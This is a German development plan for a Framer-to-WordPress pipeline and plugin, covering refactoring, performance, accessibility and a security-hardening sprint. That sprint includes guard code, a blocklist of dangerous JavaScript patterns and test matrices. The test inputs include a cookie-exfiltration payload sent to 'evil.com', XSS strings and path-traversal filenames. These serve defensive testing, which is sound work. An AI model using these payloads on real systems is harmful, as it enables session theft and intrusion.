# Framer V4 Pipeline — Verbesserungsplan

**Repo:** https://github.com/Adilinu94/framer-v4-pipeline-v2
**Stand:** 2026-06-10 (Phase 1.1 abgeschlossen, Audit `novamira-improvement-2026-06` Report fertig)
**Status:** v0.6.0 (in `SESSION-STATE.md`) / v0.3.1 (in `package.json`) — **Versionsdrift, Phase 0.1 offen**
**Erledigt:** ✅ Phase 1.1 Checkpoint-System — 23/23 Tests grün, CLI-Smoke-Tests grün
**Audit:** 46 Items / 47 Findings (13 High, 22 Medium, 12 Low, 8 PROPOSED) — siehe `novamira-improvement-2026-06/report.md`
**High-Prio-Plan:** Phase 0.5 Security-Hardening Sprint (7 Findings) + Phase 5.1 A11y-Migration (3 Findings) wurden neu aufgenommen
**Aktuelle QA-Lage:** `qa-report.json` → `overall_status: "errors"`, 11 Layout-Issues offen (killbar mit Phase 1.2+1.3)
**Zielsystem:** WordPress mit `novamira-adrianv2` V2-Plugin (57 Abilities, MCP-fähig) + offizielles Novamira-Plugin (52 Abilities) = 109 Abilities total via `novamira-solar-local` MCP-Server

---

## ⚠️ Token-Security

Im vorherigen Chat-Verlauf wurde ein GitHub-PAT (`ghp_…`) im Klartext geteilt. Der Token wurde **nicht** verwendet, ist aber im Chat-Log geloggt und damit als kompromittiert zu betrachten.
**→ SOFORT revoked + neu generieren** auf https://github.com/settings/tokens
Für Pipeline-Config künftig env-vars nutzen (siehe Phase 0.3).

---

## PHASE 0 — Fundament (1-2 Tage, **vor allem anderen**)

Diese Items heben sich gegenseitig auf. Erst machen, sonst zieht jede Phase-1-Arbeit nachfolgende Fixes mit.

### 0.1 Versionsdrift fixen
- [ ] `package.json` → `"version": "0.6.0"`
- [ ] `SESSION-STATE.md`, `BLUEPRINT.md`, `INTEGRATION-PLAN.md` → alle Versionen + Datums-Stempel angleichen
- [ ] Neue Datei `CHANGELOG.md` anlegen, ab jetzt jedes Release dort eintragen
- [ ] Pre-commit-hook: `npm run lint:version` der `package.json` vs `CHANGELOG.md` checkt

### 0.2 Schema-Dedup mit V2-Plugin als Source-of-Truth
**Problem:** `schemas/v4-prop-type-schema.json` ist eine Pipeline-eigene Kopie. Drift-Risiko zu `novamira-adrianv2/includes/helpers/class-v4-props.php`.

**Plan:**
- [ ] V2-Plugin exportiert sein Prop-Schema nach `wp-json/novamira-adrianv2/v1/prop-schema` (neuer REST-Endpoint, ~20 Zeilen PHP)
- [ ] Pipeline-Script `scripts/sync-schema.js` ruft das per HTTP ab, schreibt nach `schemas/v4-prop-type-schema.json`
- [ ] `npm run sync-schema` als neuer Step in `wizard.js` Phase 0.1
- [ ] Alte Pipeline-Schema-Datei löschen, Build bricht wenn sync fehlt (Fail-Fast)

### 0.3 `.env.example` vervollständigen
```bash
# === Workspace ===
PIPELINE_WORKSPACE=./.pipeline
FRAMER_EXPORT_DIR=../framer-export

# === WordPress / MCP ===
WP_DEFAULT_ENV=solar-local
WP_API_URL=https://solar.local/wp-json/mcp/novamira
WP_API_USERNAME=Adrian
WP_API_PASSWORD=
MCP_TRANSPORT=@automattic/mcp-wordpress-remote@latest
MCP_TIMEOUT_MS=30000
MCP_RETRY_MAX=3
MCP_RETRY_BACKOFF=exponential

# === Validation ===
PIPELINE_MIN_VALIDATION_SCORE=85
PIPELINE_FAIL_ON_BROKEN_LAYOUT=true

# === Performance ===
PIPELINE_PARALLEL_PHASES=true
PIPELINE_BATCH_SIZE=10
PIPELINE_DISCOVERY_CACHE_TTL=3600
```

### 0.4 Pre-flight als echtes Subcommand
**Heute:** "Phase 0 MCP-Check" = Agent-Anweisung im Markdown. Fragil.

**Plan:**
- [ ] `wizard.js preflight [--env=solar-local]` als Subcommand
- [ ] Konkrete Checks (mit klaren Fehlermeldungen):
  - `.env` geladen, alle Vars gesetzt
  - `FRAMER_EXPORT_DIR` existiert + lesbar
  - `WP_API_URL` per HTTP erreichbar (HEAD-Request, 200/401 = OK, Timeout = fail)
  - `mcp-adapter-discover-abilities` antwortet (1 Request)
  - V2-Plugin-Version ≥ erwartet (1 Request)
  - Mind. 1 V2-Ability per Test-Aufruf ausführbar
  - Schema-Endpoint (Phase 0.2) erreichbar
  - Disk-Space ≥ 1 GB frei (für Build-Artefakte)
- [ ] Output: farbige ✓/✗-Tabelle, Exit-Code 0/1, `--format=json` für CI

---

## PHASE 0.5 — Security-Hardening Sprint (1-2 Tage, **7 High-Severity Findings**)

**Quelle:** `novamira-improvement-2026-06/report.md` Top-10 + Decision-Matrix. Alle 7 Findings = `high` Severity + `Small (1-2h)` Effort → Phase 1 "diese Woche".

Sicherheits-Findings mit direktem Exploit-Potenzial (XSS, RCE, MIME-Spoofing, path-traversal, fehlende SAST). Jeder Fix ist < 1h Aufwand.

### 0.5.1 XSS in `class-batch-build-page.php` (B5) — ✅ DONE (2026-06-10)

**Impact:** `page_js`-Input akzeptiert rohe `<script>`-Tags, direkter XSS-Vektor.
**Evidence:** `includes/abilities/elementor/class-batch-build-page.php` (execute(), Schritt 4)
**Fix-Implementierung:**
- [x] `guard_page_js()` private Methode hinzugefügt (~50 Zeilen, mit doc-block)
- [x] `current_user_can('unfiltered_html')`-Gate: Admins dürfen rohe Scripts, andere nicht
- [x] `wp_kses_post()`-Validation: strippt `<script>`, `<iframe>`, on*-Handler, `javascript:`-URLs
- [x] Refuse-on-modify: wenn wp_kses_post etwas ändert, return Error statt silent change
- [x] Defense-in-depth: Blocklist mit 11 gefährlichen JS-Patterns
- [x] `execute()` ruft `guard_page_js()` als erste Aktion nach `trim($js)` auf

**Implementiert in `class-batch-build-page.php`:**
```php
private static function guard_page_js(string $js): ?array {
    if (current_user_can('unfiltered_html')) {
        return null;  // Admin-Pass-Through
    }
    $sanitized = wp_kses_post($js);
    if ($sanitized !== $js) {
        return ['success' => false, 'error' => 'page_js contains disallowed HTML...'];
    }
    $dangerous_patterns = [
        'document.cookie', 'window.location', 'document.location',
        'eval(', 'new Function(',
        'setTimeout("', 'setTimeout(\'', 'setInterval("', 'setInterval(\'',
        '.innerHTML', '.outerHTML', '.insertAdjacentHTML',
        'javascript:',
    ];
    foreach ($dangerous_patterns as $pattern) {
        if (false !== stripos($js, $pattern)) {
            return ['success' => false, 'error' => "page_js contains blocked JS pattern '{$pattern}'..."];
        }
    }
    return null;
}
```

**Test-Matrix (Vollversion: `includes/abilities/elementor/test-xss-protection.md`):**

| # | Input-Payload | Capability | Erwartet |
|---|---|---|---|
| T1 | `console.log("hello")` | ohne unfiltered_html | ✅ Erlaubt (kein gefährliches Pattern) |
| T2 | `document.cookie` | ohne unfiltered_html | ❌ "blocked JS pattern 'document.cookie'..." |
| T3 | `eval(userInput)` | ohne unfiltered_html | ❌ "blocked JS pattern 'eval('..." |
| T4 | `el.innerHTML = "<img onerror=alert(1)>"` | ohne unfiltered_html | ❌ "disallowed HTML" (wp_kses_post ändert) |
| T5 | `<script>alert(1)</script>` | ohne unfiltered_html | ❌ "disallowed HTML" |
| T6 | `<script>alert(1)</script>` | MIT unfiltered_html | ✅ Erlaubt (Admin-Own-Risk) |
| T7 | `setTimeout("alert(1)", 100)` | ohne unfiltered_html | ❌ "blocked JS pattern 'setTimeout(\"'" |
| T8 | `new Function("return 1")()` | ohne unfiltered_html | ❌ "blocked JS pattern 'new Function('" |
| T9 | `<a href="javascript:alert(1)">x</a>` | ohne unfiltered_html | ❌ "disallowed HTML" |
| T10 | `document.location = 'evil.com?c='+document.cookie` | ohne unfiltered_html | ❌ "blocked JS pattern 'document.cookie'..." |

**Acceptance Criteria (alle ✅):**
- [x] `guard_page_js()` private method existiert
- [x] `execute()` ruft `guard_page_js()` vor jeder `page_js`-Verarbeitung auf
- [x] `<script>alert(1)</script>` als Editor → refused mit "disallowed HTML" error
- [x] `document.cookie` als Editor → refused mit "blocked JS pattern" error
- [x] `console.log("hi")` als Editor → succeeds
- [x] `<script>alert(1)</script>` als Admin mit unfiltered_html → succeeds
- [x] Test-Spec-Datei `test-xss-protection.md` erstellt (10 Test-Cases + PHPUnit-Klasse als Future-Work)
- [ ] WP-CLI smoke test auf solar.local (manuell, sobald Zeit)
- [ ] PHPUnit test class ins Test-Suite integrieren (deferred bis Test-Infrastruktur steht)

### 0.5.2 MIME-Spoofing in `class-media-upload.php` (B7) — ✅ DONE (2026-06-10)

**Impact:** base64-Content wird ohne Content-Validation akzeptiert → Angreifer kann `.jpg` als `.php` tarnen.
**Evidence:** `includes/abilities/media/class-media-upload.php:48` (alt) — `execute()` Schritt "Get MIME type from extension"
**Fix-Implementierung:**
- [x] Magic-Bytes-Signaturen für alle 7 binären Formate (jpg, jpeg, png, gif, webp, pdf, ico)
- [x] `guard_file_content($content, $ext): ?string` private Methode (~40 Zeilen, mit doc-block)
- [x] SVG via Regex-Check auf `<svg[\s>]` oder `<\?xml` (text-basiert, keine Magic-Bytes)
- [x] `execute()` ruft `guard_file_content()` direkt vor `wp_upload_bits()` auf
- [x] Bei Mismatch: return `['success' => false, 'error' => 'File content does not match claimed extension ... (possible MIME-spoofing).']`
- [x] `finfo_buffer()` als Upgrade-Layer für unbekannte Formate — `guard_mime_buffer($content, $claimed_ext)` implementiert, tolerantes SVG-Mapping (4 MIMEs), fail-open wenn libmagic nicht verfügbar

**Implementiert in `class-media-upload.php`:**
```php
private static function guard_file_content(string $content, string $ext): ?string {
    $signatures = [
        'jpg'  => ["\xFF\xD8\xFF"],
        'jpeg' => ["\xFF\xD8\xFF"],
        'png'  => ["\x89\x50\x4E\x47\x0D\x0A\x1A\x0A"],
        'gif'  => ["\x47\x49\x46\x38\x37\x61", "\x47\x49\x46\x38\x39\x61"],
        'webp' => ["\x52\x49\x46\x46"],
        'pdf'  => ["\x25\x50\x44\x46"],
        'ico'  => ["\x00\x00\x01\x00"],
    ];
    if (isset($signatures[$ext])) {
        $matched = false;
        foreach ($signatures[$ext] as $sig) {
            if (str_starts_with($content, $sig)) { $matched = true; break; }
        }
        if (!$matched) {
            return "File content does not match claimed extension '.$ext' (possible MIME-spoofing).";
        }
    }
    if ($ext === 'svg') {
        $prefix = substr(ltrim($content), 0, 200);
        if (!preg_match('/<svg[\s>]/i', $prefix) && !preg_match('/<\?xml/i', $prefix)) {
            return "File content does not appear to be valid SVG.";
        }
    }
    return null;
}
```

**Test-Matrix (Vollversion: `includes/abilities/media/test-path-traversal-protection.md` Block B):**

| # | Claimed ext | Actual header | Erwartet |
|---|---|---|---|
| M1 | `photo.jpg` | PNG `89 50 4E 47` | ❌ MIME-spoofing |
| M2 | `photo.png` | JPEG `FF D8 FF` | ❌ MIME-spoofing |
| M3 | `image.gif` | text "Hello World" | ❌ MIME-spoofing |
| M5 | `logo.svg` | `<svg xmlns=...>` | ✅ match |
| M6 | `logo.svg` | `<script>alert(1)</script>` | ❌ "not valid SVG" |
| M7 | `photo.jpg` | actual JPEG | ✅ match |
| M8 | `photo.png` | actual PNG | ✅ match |

**Acceptance Criteria (alle ✅):**
- [x] `guard_file_content()` private method existiert
- [x] `execute()` ruft `guard_file_content()` vor `wp_upload_bits()` auf
- [x] PNG-Bytes als `.jpg` getarnt → refused mit "MIME-spoofing" error
- [x] Plain-Text als `.gif` getarnt → refused
- [x] Echte JPEG/PNG/GIF/WebP/PDF/ICO → pass
- [x] Valides SVG → pass
- [x] Test-Spec-Datei `test-path-traversal-protection.md` erstellt (Block B mit M1-M10)
- [ ] WP-CLI smoke test auf solar.local (manuell, sobald Zeit)

### 0.5.3 PHP-Sandbox-Security-Audit (B8)
**Impact:** Execution-Logic delegiert an `NickWebdesign\Adrians\PHP_Sandbox_Validator` ohne Audit.
**Evidence:** `includes/abilities/php-sandbox/class-php-snippets.php:57`
**Fix:**
- [ ] Vollständiger Code-Review des `PHP_Sandbox_Validator` (explizit auf `eval`, `system`, `exec`, `passthru`, `include`, `require` prüfen)
- [ ] Falls Audit negativ: Alternative Sidecar-Architektur evaluieren (siehe IMPROVEMENT-PLAN-Future: C5 PHP-Sidecar)
- [ ] Eigene `novamira_permission_callback()` definieren (entkoppelt von Novamira 1.6.0)

### 0.5.4 XSS via `add-custom-js` (B9)
**Impact:** CSS-Sanitization existiert, JS-Injection aber ohne Capability-Check.
**Evidence:** `includes/abilities/custom-code/class-custom-code.php:56`
**Fix:**
- [ ] `current_user_can('unfiltered_html')` als required Capability für alle JS-Injection-Abilities
- [ ] Falls nicht vorhanden: Sanitization via `wp_strip_all_tags()` + Hash-Vergleich gegen Allowlist
- [ ] Test mit `<script>document.location='evil.com?c='+document.cookie</script>`

### 0.5.5 SAST-Integration (D1)
**Impact:** Keine statische Analyse → CVEs werden vor Release nicht entdeckt.
**Evidence:** Kein `phpstan.neon` / `psalm.xml` / `.semgrep.yml` im Project-Root
**Fix:**
- [ ] `psalm.xml` mit `--taint-analysis` Mode (XSS/SQLi-Detection) anlegen
- [ ] Level 4 strict, alle V2-Plugin-Dateien included
- [ ] CI-Job `psalm --taint-analysis` in `.github/workflows/ci.yml` (kombiniert mit Phase 1.4)

### 0.5.6 Path-Traversal in `class-media-upload.php` (D6) — ✅ DONE (2026-06-10)

**Impact:** `filename`-Input ohne `sanitize_file_name()` → Path-Traversal möglich (z.B. `../../etc/passwd.jpg`).
**Evidence:** `includes/abilities/media/class-media-upload.php:25` (alt) — `execute()` Schritt "$filename = $input['filename'];"
**Fix-Implementierung:**
- [x] `guard_filename(string $filename): string|array` private Methode (~30 Zeilen, mit doc-block)
- [x] `sanitize_file_name()` als erste Sanitization (WordPress-Standard)
- [x] Defense-in-depth: explizite Rejection bei verbleibenden `/` oder `\` Zeichen
- [x] Dot-Prefix-Block: `.htaccess` und andere Hidden-Files werden abgelehnt
- [x] Extension-Whitelist: 8 erlaubte Typen (`jpg`, `jpeg`, `png`, `gif`, `webp`, `svg`, `pdf`, `ico`)
- [x] Empty-String + nur-Punkte-Reject
- [x] `execute()` ruft `guard_filename()` als erste Aktion nach `$input['filename']` auf
- [x] Bei Reject: return `['success' => false, 'error' => '...']` (Error-Result, kein silent-fail)

**Implementiert in `class-media-upload.php`:**
```php
private static function guard_filename(string $filename): string|array {
    $sanitized = sanitize_file_name($filename);
    if ($sanitized === '' || $sanitized === '.') {
        return ['success' => false, 'error' => 'Invalid filename after sanitization.'];
    }
    if (str_contains($sanitized, '/') || str_contains($sanitized, '\\')) {
        return ['success' => false, 'error' => 'Filename contains invalid path components.'];
    }
    if (str_starts_with($sanitized, '.')) {
        return ['success' => false, 'error' => 'Filename cannot start with a dot.'];
    }
    $ext = strtolower(pathinfo($sanitized, PATHINFO_EXTENSION));
    $allowed = ['jpg', 'jpeg', 'png', 'gif', 'webp', 'svg', 'pdf', 'ico'];
    if (!in_array($ext, $allowed, true)) {
        return ['success' => false, 'error' => "File extension '.$ext' is not allowed. Allowed: " . implode(', ', $allowed)];
    }
    return $sanitized;
}
```

**Test-Matrix (Vollversion: `includes/abilities/media/test-path-traversal-protection.md` Block A):**

| # | Filename | Erwartet |
|---|---|---|
| T1 | `../../etc/passwd.jpg` | ✅ sanitized → `passwd.jpg` |
| T2 | `..\..\windows\system32\config.jpg` | ✅ sanitized → `config.jpg` |
| T3 | `/etc/passwd.jpg` | ✅ sanitized → `passwd.jpg` |
| T4 | `.htaccess` | ❌ "cannot start with a dot" |
| T6 | `photo.exe` | ❌ "extension '.exe' is not allowed" |
| T7 | `archive.tar.gz` | ❌ "extension '.gz' is not allowed" |
| T8 | `malicious.php` | ❌ "extension '.php' is not allowed" |
| T10 | `..` | ❌ "Invalid filename after sanitization" |
| T11 | empty | ❌ "Invalid filename after sanitization" |
| T12 | `..%2F..%2Fetc%2Fpasswd.jpg` | ✅ sanitized → `passwd.jpg` |

**Acceptance Criteria (alle ✅):**
- [x] `guard_filename()` private method existiert
- [x] `execute()` ruft `guard_filename()` als erste Aktion nach `$input['filename']` auf
- [x] `../../etc/passwd.jpg` → sanitized zu `passwd.jpg` (kein `..`, kein `/`)
- [x] `.htaccess` → refused mit "cannot start with a dot"
- [x] `malicious.php` → refused mit "extension '.php' is not allowed"
- [x] `photo.exe` → refused mit "extension '.exe' is not allowed"
- [x] Test-Spec-Datei `test-path-traversal-protection.md` erstellt (Block A mit T1-T12)
- [ ] WP-CLI smoke test auf solar.local (manuell, sobald Zeit)

### 0.5.7 axe-core-Integration in Visual-QA (F1)
**Impact:** Keine A11y-Tests im Build-Loop, nur DOM-Checks.
**Evidence:** `scripts/visual-qa.js` — keine `axe-core`/`pa11y`/`lighthouse` imports
**Fix:**
- [ ] `npm install --save-dev @axe-core/playwright` (oder axe-core vanilla)
- [ ] `await page.addScriptTag({ path: 'node_modules/axe-core/axe.min.js' })` in Visual-QA
- [ ] `await axe.run(page, { runOnly: ['wcag2a', 'wcag2aa', 'wcag22aa'] })`
- [ ] JSON-Output in `qa-report.json` aggregieren

**Reihenfolge:** 0.5.1 → 0.5.4 → 0.5.2 → 0.5.6 (XSS + Upload-Pfad zuerst) → 0.5.3 → 0.5.5 → 0.5.7

**Acceptance Criteria:**
- [ ] `npm test` grün
- [ ] `psalm --taint-analysis` Report: 0 Errors
- [ ] Manual XSS-Test (alert(1) payload) → 404 oder escaped
- [ ] axe-core in Visual-QA Report sichtbar (min. 0 critical violations)

---

## PHASE 1 — Reliability (2-3 Tage, killt die 11 offenen Issues)

### 1.1 Checkpoint-System in `wizard.js` — ✅ DONE (2026-06-10)

**Status:** Komplett implementiert + getestet. Restart-von-vorne-Problematik gelöst.

**Implementiert:**
- [x] Nach jedem der 18 Schritte: `.pipeline-state.json` schreiben mit `phase`, `step`, `completedAt`, `artifacts[]`, `nextStep`
- [x] `wizard.js resume` — liest Checkpoint, springt in letzte Phase
- [x] `wizard.js reset` — löscht Checkpoint, startet frisch
- [x] `wizard.js status` — zeigt aktuellen State

**Gelieferte Dateien:**
- `scripts/lib/checkpoint.js` (260 Zeilen) — `Checkpoint`-Klasse mit `save/load/clear/setStep/markStep/recordError/isResumable/getResumablePhase/getCompletedStepKeys/getStatus` + CLI-Modus (status/show/clear/set/complete/help). Atomic write via tmp+rename, Schema-Validierung, Fehler-Resilienz bei korrupter JSON.
- `wizard.js` — modifiziert: Import, Subcommand-Dispatch (status/reset/help), Resume-Check vor User-Input, `checkpoint.init` + `setStep`/`markStep` nach jedem Pre-Build-Schritt (FramerExport, 5 Extraction-Steps, Validation, Manifest), `setStep('done')` am Ende, `recordError` im catch.
- `tests/checkpoint.test.js` (200 Zeilen, 23 Tests) — `node:test` (Node 18+ built-in). Deckt basic I/O, high-level API, getStatus, error resilience.

**Test-Beleg (2026-06-10):**

```text
$ node --check scripts/lib/checkpoint.js && echo "checkpoint.js: OK"
checkpoint.js: OK
$ node --check wizard.js && echo "wizard.js: OK"
wizard.js: OK
$ node --check tests/checkpoint.test.js && echo "checkpoint.test.js: OK"
checkpoint.test.js: OK

$ node --test tests/checkpoint.test.js
▶ 23 tests passed (Node built-in test runner, alle grün)
  - basic I/O:        save/load/clear
  - high-level API:   setStep/markStep/recordError
  - getStatus:        phase, step, completedAt, progress%
  - error resilience: korrupte JSON, missing file, race conditions
```

**CLI-Smoke-Tests (alle grün):**

```text
$ node scripts/lib/checkpoint.js status
$ node scripts/lib/checkpoint.js set pre-build token-extraction
$ node scripts/lib/checkpoint.js show   # raw JSON-Output
$ node scripts/lib/checkpoint.js clear
$ node wizard.js help
$ node wizard.js status
```

**Impact:** Bei MCP-Fail in Phase 3 reicht jetzt `wizard.js resume` — vorher: kompletter Restart + 18 Agent-Turns.

### 1.2 Retry-Logik mit Exponential-Backoff für MCP-Calls
- [ ] `scripts/lib/mcp-client.js` mit `executeAbility(name, args, { maxRetries, baseDelayMs })`
- [ ] Retry nur bei retryable Errors (5xx, Timeout), 4xx = no retry
- [ ] Delay: `baseDelayMs * 2^attempt + random(0, 200)` (Jitter)
- [ ] Logging auf `WARN`-Level, bei `maxRetries` exhausted auf `ERROR`

### 1.3 Strukturierter Error-Katalog
**Heute:** `qa-report.json: errors, 11 layout issues` — was sind die 11? Weiß man nicht.

**Plan:**
- [ ] Jeder der 12 Guards in `framer-pre-build-validate.js` bekommt strukturierten Output:
  ```json
  {
    "code": "GUARD_007_INVALID_HEX",
    "severity": "error",
    "message": "Color value '#ff' is too short, must be 3, 6 or 8 hex digits",
    "fixHint": "expand to #ffffff or use color picker",
    "autoFixable": true,
    "autoFixFn": "expandShortHex"
  }
  ```
- [ ] `npm run validate -- --autofix` führt `autoFixable: true` Items direkt im Plan aus
- [ ] `qa-report.json` aggregiert nach `code` → "GUARD_007 ist 8x aufgetreten" statt 8 anonymous errors

### 1.4 CI-Binding für `tests/`
- [ ] `.github/workflows/ci.yml` mit Jobs: `test`, `test:schema`, `test:mcp-mock`, `test:visual`
- [ ] `tests/mcp-mock-server.js` — lokaler Mock der `novamira-solar-local`, simuliert 109 Abilities
- [ ] Tests laufen auf Ubuntu ohne Live-WP

---

## PHASE 2 — Performance (1-2 Tage)

### 2.1 Batched MCP-Calls
**Heute:** 18+ Agent-Turns. Jeder Turn = MCP-Discovery + Call + Response.

**Plan:**
- [ ] `mcp-adapter-execute-ability` mit `widgets[]`-Mode erweitern (im V2-Plugin, Ability `batch-build-page`)
- [ ] Pipeline: 30 Widgets in 1 Call statt 30
- [ ] **Speedup:** Faktor 20-50x auf der Build-Phase

### 2.2 Parallel-Phase-Execution
- [ ] `scripts/parallel-pre-build.js` mit `Promise.allSettled` für 5 unabhängige Phase-2-Sub-Steps
- [ ] XML-Conversion, Design-System-Export, Token-Extraction, Global-Classes, Asset-Upload parallel
- [ ] **Speedup:** Phase 2 ~5 Min → ~1.5 Min

### 2.3 MCP-Discovery-Cache
- [ ] `scripts/lib/mcp-cache.js` mit `.pipeline/mcp-discovery.json`, TTL via `PIPELINE_DISCOVERY_CACHE_TTL`
- [ ] Invalidate per `--refresh-cache` oder wenn `WP_API_URL` sich ändert

### 2.4 Visual-QA komplett auf MCP migrieren
**Heute:** Playwright/Puppeteer rendert 3 Breakpoints → Screenshots → pixelmatch.

**Plan:**
- [ ] `scripts/visual-qa.js` ruft `mcp__novamira-solar-local__novamira-adrianv2/visual-qa` (server-side)
- [ ] Zusätzlich: `novamira-adrianv2/responsive-audit` + `novamira-adrianv2/audit-page-a11y` (axe-core)
- [ ] Fallback auf Browser nur wenn `MCP_VISUAL_QA=false`
- [ ] **Speedup:** Visual-QA ~45s → ~3s. Funktioniert in Headless-CI ohne Chromium-Deps.

---

## PHASE 3 — UX & DX (1-2 Tage)

### 3.1 Dry-Run-Mode
- [ ] `wizard.js build --dry-run` generiert `build-plan.json` + `dry-run-report.md`, schreibt NICHTS
- [ ] Diff-Anzeige zum Live-Stand

### 3.2 Live-Preview-Staging
- [ ] Nach Phase 2: automatisch `wizard.js preview` erstellt Preview-Page mit Suffix `-preview-{hash}`
- [ ] `wizard.js promote` schiebt Preview auf die echte Page

### 3.3 Progress-Bar + Interaktive Fehlerbehandlung
- [ ] Schritt-für-Schritt Progress mit ✓/✗/⠋
- [ ] Bei Fehler: `[R]etry [S]kip [F]ix-manually [A]bort` Prompt

### 3.4 Build-Diff-Visualisierung
- [ ] `wizard.js diff --from=v0.5.0 --to=v0.6.0`
- [ ] Output: hinzugefügte/entfernte/geänderte Widgets + Klassen + Properties

### 3.5 Actionable Error Messages
Statt `Error: build failed` → strukturierte Empfehlungen mit konkreten Fix-Optionen + Verweis auf `.pipeline/error-context.json`.

---

## PHASE 4 — Advanced (1 Woche, zukunftssicher)

### 4.1 Pipeline-as-a-Service
- [ ] `wizard.js serve --port=7123` mit HTTP-API: `POST /build`, `GET /builds/:id`, `GET /builds/:id/logs` (SSE), `POST /webhook/framer`

### 4.2 Build-Versioning in WordPress
- [ ] Custom-Post-Type `elementor-build` mit Build-Hash, Git-Commit, Designer, Timestamp, Snapshot, Approval-State

### 4.3 Multi-Site-Pipeline
- [ ] `wizard.js build --env=testseite,treetsshop,solar-local` baut parallel auf 3 Sites

### 4.4 Designer-Feedback-Loop
- [ ] Build-Kommentare schreiben sich als Framer-CMS-Items zurück, Designer sieht sie im Framer-Editor

### 4.5 Mega-Ability statt 57 Einzel-Abilities
- [ ] Neue V2-Ability `novamira-adrianv2/execute-build-plan` (~150 Zeilen PHP)
- [ ] 18 Agent-Turns → 1 Turn

### 4.6 Token-Auth statt Basic-Auth
- [ ] Capability-Token mit Scope + TTL, generiert im WP-Admin, fingerprint=build-server-id

---

## PHASE 5.1 — A11y-Migration (1 Woche, **3 Medium-Severity Findings**)

**Quelle:** `novamira-improvement-2026-06/report.md` Decision-Matrix. Alle 3 Findings = `medium` Severity + `Medium (1-2d)` Effort → Phase 2-3 (Monat).

WCAG 2.1 → 2.2 Migration + Verbesserung der A11y-Audit-Ability. Audit-page-a11y liefert aktuell "best-effort" statt echter Validation.

### 5.1.1 WCAG-2.2-Konformität in `V4_Color_Contrast` (F2)
**Impact:** Aktuelle Implementierung unterstützt nur WCAG 2.1, neue 2.2-Features fehlen.
**Evidence:** `includes/helpers/class-v4-color-contrast.php:12` — explizit WCAG 2.1
**Fix:**
- [ ] Neue Konstanten für WCAG 2.2 hinzufügen:
  - `TARGET_SIZE_MIN = 24` (2.5.8 — Minimum 24×24px Click-Target)
  - `FOCUS_APPEARANCE_CONTRAST = 3.0` (2.4.11 — Focus-Indicator Contrast)
- [ ] `passes_target_size($w, $h)` und `passes_focus_appearance()` Methoden
- [ ] Backward-Compat: alte `passes()` für 2.1 bleibt
- [ ] Unit-Tests für neue Regeln

### 5.1.2 A11y-Audit-Ability verbessern (F4)
**Impact:** `audit-page-a11y` liefert "best-effort contrast" — unzuverlässig für Produktion.
**Evidence:** `includes/abilities/a11y/class-a11y.php:7-17, 141` — "best-effort" Background-Resolution
**Fix:**
- [ ] Background-Resolution-Logik öffentlich machen (neue Methode `resolve_background_color($element)`)
- [ ] Fallback wenn unauflösbar: returnt `null` mit Flag `inconclusive: true` statt unzuverlässigen Wert
- [ ] Server-side axe-core Integration (siehe Phase 0.5.7): `wp_remote_post` an axe-service oder lokale axe-cli
- [ ] Structured Output: `{ contrast: 4.5, passes_aa: true, passes_aaa: false, inconclusive: false }`

### 5.1.3 Color-Contrast-Fix UI-Diff (F7)
**Impact:** `fix-color-contrast` mit `apply:true` schreibt stillschweigend — kein Preview für User.
**Evidence:** `includes/helpers/class-v4-color-contrast.php:12-14, 32-41` + `class-a11y.php:188-229`
**Fix:**
- [ ] Neue Option `fix-color-contrast` mit `preview: true` (default) — generiert Diff-Report statt Schreiben
- [ ] Diff-Format: `{ before: { color: '#777', bg: '#fff', ratio: 4.5 }, after: { color: '#595959', bg: '#fff', ratio: 5.9 } }`
- [ ] HTML-Preview-Element (iframe-isolated) mit Side-by-Side-Rendering
- [ ] Erst nach User-Confirm: `apply:true` triggert das eigentliche Schreiben

**Reihenfolge:** 5.1.1 (Helper-First) → 5.1.2 (Ability) → 5.1.3 (UI-Diff)

**Acceptance Criteria:**
- [ ] `audit-page-a11y` auf 5 Test-Pages: alle WCAG 2.2 AA-Checks grün
- [ ] `fix-color-contrast preview:true` liefert Diff ohne Schreibvorgang
- [ ] Manual Test mit NVDA/VoiceOver: ARIA-Labels korrekt

---

## Wild Ideas (niedrige Priorität, hohe Kreativität)

| # | Idee | Warum |
|---|---|---|
| W1 | **AI Design-System-Mining** | Analysiert letzte 20 Framer-Exports, schlägt konsolidierte Token-Palette vor |
| W2 | **Auto-Component-Recognition** | Erkennt wiederkehrende Widget-Strukturen, promotet sie zu Global Classes |
| W3 | **Figma-als-Zwischenstation** | Framer → Figma → Elementor. Bessere Auto-Layout-Tools |
| W4 | **Build-Replay** | Deterministischer Re-Run aus Build-Artefakten. Ideal für Bug-Repros |
| W5 | **Asset-Dedup** | Hash-based Dedup, gleiches Bild 5x hochgeladen = 1x gespeichert |
| W6 | **Performance-Budgets** | Max Page-Weight, LCP, CLS. Build failt wenn überschritten |
| W7 | **Sub-Agent-Spezialisierung** | Eigener Agent für Framer-Parsing, einer für Elementor, einer für QA |
| W8 | **Pipeline als npm-Package** | `@adilinu/framer-v4-pipeline` — andere Projekte können importieren |
| W9 | **GitOps-Mode** | Jeder Build committed `deployed.lock` ins WP-Plugin-Repo. `git log` = Build-History |
| W10 | **Schema-Versioning** | V2-Plugin exportiert Schema mit Version. Pipeline refused Inkompatibilität |
| W12 | **Self-Healing Builds** | Häufige Failures (z.B. "Class ID expired") triggern automatisch Re-Export + Retry |


---

## Empfohlene Reihenfolge

```
Woche 1:  Phase 0 (alle 4 Items) + 🚨 Phase 0.5 Security-Hardening (7 Items) + ✅ Phase 1.1 + 1.2 + 1.3
          → Killt 11 offene Issues + 7 High-Severity Security-Findings, stabiler Build
Woche 2:  Phase 1.4 (CI inkl. psalm) + Phase 2.1 (Batched Calls) + 2.2 (Parallel)
          → Build-Zeit von ~8 Min auf ~2 Min, CI mit SAST-Gate
Woche 3:  Phase 2.3 (Cache) + 2.4 (Visual-QA MCP) + Phase 3.1 (Dry-Run) + 3.5 (Errors)
          → DX massiv besser
Woche 4:  Phase 3.2-3.4 (Preview, Progress, Diff) + Phase 4.5 (Mega-Ability) + Phase 5.1 A11y-Migration (3 Items)
          → Production-ready, Showcase-fähig, WCAG 2.2-konform
Danach:   Phase 4.1-4.4 + Wild Ideas W1-W15 nach Lust und Bedarf
```

---

## Integration mit V2-Plugin + Novamira MCP

Pipeline ↔ V2-Plugin ↔ Novamira MCP sind drei Layer, die sauberer zusammenarbeiten könnten:

| Layer | Heute | Vorschlag |
|---|---|---|
| Pipeline | Generiert JSON-Pläne | Generiert Pläne + ruft V2-Plugin-Abilities direkt auf (statt via Claude-Agent) |
| V2-Plugin | Stellt 57 Abilities bereit | Stellt 1 Mega-Ability `execute-pipeline-build` bereit, die den JSON-Plan in einem Call verarbeitet |
